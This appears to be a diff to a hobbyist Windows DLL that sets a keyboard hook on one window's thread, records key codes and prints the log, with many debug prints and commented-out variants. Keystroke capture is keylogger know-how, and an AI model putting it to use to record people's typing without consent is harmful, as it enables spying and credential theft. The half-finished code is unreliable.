@@ -3,7 +3,8 @@
 #include "window_manager.h"
 #include "keyboard_tracer.h"
 
-#pragma data_seg(".shareddata")
+#pragma data_seg(".sharedata")
+HWND m_hWnd = 0;
 HWND hWnd = 0;
 HHOOK hHook = 0;
 #pragma data_seg()
@@ -89,17 +90,24 @@ void initialize()
 {
 	window_manager = new WindowManager();
 	tracer = new KeyboardTracer();
+	m_hWnd = GetForegroundWindow();
+	char buf[100];
+	GetWindowTextA(m_hWnd, buf, 100);
+	window_manager->SetWinTitle(buf);
+	window_manager->PrintWinTitle();
 }
 
 extern "C" __declspec(dllexport) LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	std::cout << "hello" << std::endl;
+	//SendMessage(m_hWnd, WM_KEYDOWN, wParam, lParam);
+	tracer->registKeyLog(wParam);
+	//MessageBoxW(m_hWnd, L"hello", TEXT("click"), MB_OK);
 	if (nCode < 0)
-	{
+	{ 
 		return CallNextHookEx(hHook, nCode, wParam, lParam);
 	}
 	tracer->setLpBinary(lParam);
-	MessageBoxW(hWnd, L"hello", TEXT("click"), MB_OK);
 	if (tracer->getLpBinary(0) == 1)
 	{
 		tracer->registKeyLog(wParam);
@@ -116,7 +124,16 @@ extern "C" __declspec(dllexport) void StartHook()
 		return;
 	}
 
-	hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, 0);
+	//HINSTANCE hInst;
+	//hInst = (HINSTANCE)GetWindowLongPtr(hWnd, GWLP_HINSTANCE);
+	
+	
+	//hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, 0);
+
+
+	//hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, GetCurrentThreadId());
+	hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, GetWindowThreadProcessId(hWnd, NULL));
+	//hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, NULL, 0);
 	if (hHook == NULL)
 	{
 		std::cout << "[!!!] hook is null. fail to start hook" << std::endl;
@@ -131,7 +148,59 @@ extern "C" __declspec(dllexport) void StartHook()
 
 extern "C" __declspec(dllexport) bool EndHook()
 {
+	tracer->print_log();
 	return UnhookWindowsHookEx(hHook);
 }
+
+extern "C" __declspec(dllexport) void Wait()
+{
+	//HACCEL hAccelTable = LoadAccelerators(hInst, MAKEINTRESOURCE(IDC_WINDOWSPROJECT1));
+	MSG msg;
+	int bValue;
+	std::cout << "wait" << std::endl;
+	int i = 0;
+	/*while ((bValue = GetMessage(&msg, hWnd, 0, 0)) != 0)
+	{
+		if (bValue == -1)
+		{
+			break;
+		}
+		else 
+		{
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
+		}
+	}*/
+	while (TRUE)
+	{
+		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
+		{
+			if (msg.message == WM_QUIT) {
+				break;
+			}
+			std::cout << "treeans" << std::endl;
+			DispatchMessage(&msg);
+		}
+		else
+		{
+			if (msg.wParam == WH_KEYBOARD)
+			{
+				std::cout << "trans" << std::endl;
+				TranslateMessage(&msg);
+				DispatchMessage(&msg);
+			}
+		}
+	}
+}
+
+extern "C" __declspec(dllexport) void Wait2()
+{
+
+	while (true)
+	{
+		std::cout << "loop" << std::endl;
+	}
+}
+
 
 
